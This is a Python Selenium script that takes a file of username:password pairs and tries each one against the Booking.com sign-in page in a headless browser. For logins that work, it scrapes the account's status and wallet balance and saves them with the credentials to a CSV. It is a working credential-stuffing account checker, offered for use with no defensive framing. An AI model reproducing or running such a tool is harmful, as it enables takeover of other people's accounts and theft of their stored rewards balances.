# %%
import subprocess
try:
    from selenium import webdriver
    from selenium.webdriver.firefox.service import Service as FirefoxService
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.firefox.options import Options
    from selenium.webdriver.support import expected_conditions as EC
except:
    print("Installing selenium as selenium isn't installed")
    subprocess.check_call(['pip', 'install', 'selenium'])
try:
    import time, csv, os
except:
    print("Installing selenium as csv isn't installed")
    subprocess.check_call(['pip', 'install', 'selenium'])

# %%
login = "https://account.booking.com/sign-in"
login_xpath = '//*[@id="username"]'
login_button = "/html/body/div[1]/div/div/div/div[2]/div[1]/div/div/div/div/div/div/form/div[3]/button"
pass_xpath = '//*[@id="password"]'
pass_button = "/html/body/div[1]/div/div/div/div[2]/div[1]/div/div/div/div/div/div/form/div[2]/button"
status = "/html/body/div[3]/div/div/header/nav[1]/div[2]/div/span/button/span/div/div[2]/div[2]/div/span"
balance = "/html/body/div[4]/div/div/div/div[2]/div/div/div[1]/div/div[2]/div"
redirected = "/html/body/div[3]/div/div/header/nav[1]/div[1]/div/span/a/svg/path"
wallet = "https://secure.booking.com/rewards_and_wallet/wallet.id.html"

file_path = input("Input yout .csv filename : ")

# %%
def save(data):
    file_exists = os.path.isfile(file_path)
    with open(file_path, 'a', newline='') as csvfile:
        csv_writer = csv.writer(csvfile)
        if not file_exists:
            csv_writer.writerow(['Username', 'Password', 'Status','Balance'])
        csv_writer.writerow(data)

# %%
def check(usn,pasw):
    options = Options()
    options.add_argument('--headless')
    browser = webdriver.Firefox(options= options, service=FirefoxService(r"geckodriver.exe"))   
    wait = WebDriverWait(browser, 15)
    browser.get(login)
    wait.until(EC.presence_of_element_located((By.XPATH, login_xpath))).send_keys(usn)
    wait.until(EC.presence_of_element_located((By.XPATH, login_button))).click()
    time.sleep(0.25)
    wait.until(EC.presence_of_element_located((By.XPATH, pass_xpath))).send_keys(pasw)
    wait.until(EC.presence_of_element_located((By.XPATH, pass_button))).click()
    wait.until(EC.presence_of_element_located((By.XPATH, status)))   
    status_element = browser.find_element(By.XPATH,status)
    status_text = status_element.text 
    browser.get(wallet)
    balance_element = browser.find_element(By.XPATH,balance)
    balance_text = balance_element.text
    print("Status:", status_text)
    print("Balance:", balance_text)
    save([usn,pasw,status_text,balance_text])
    browser.close()

# %%
try:
    with open(input("Input credentials txt path : "), 'r') as file:
        lines = file.readlines()
        for line in lines:
            username, password = line.strip().split(':')
            print(f"Logging in with username: {username} and password: {password}")
            check(username, password)
except : print("File cant be found!")


